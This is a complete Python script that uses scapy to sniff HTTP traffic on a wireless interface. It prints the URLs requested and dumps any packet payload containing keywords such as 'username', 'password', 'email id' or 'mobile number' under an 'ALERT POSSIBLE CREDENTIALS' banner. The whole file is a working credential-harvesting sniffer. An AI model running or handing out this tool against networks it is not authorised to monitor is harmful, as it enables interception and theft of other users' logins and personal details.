#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # print(packet.show())
        # extracting urls i.e HOST and PATH
        url = get_url(packet)
        print("[+]HTTP REQUEST >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print(
                "_________________________________________ALERT POSSIBLE CREDENTIALS____________________________________")
            print(login_info + "\n")

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "Password", "password", "pass", "login by", "Login By", "Email Id", "email id", " Mobile Number", "mobile number"]
        for keyword in keywords:
            if keyword in load:
                return load
sniff("wlan0")
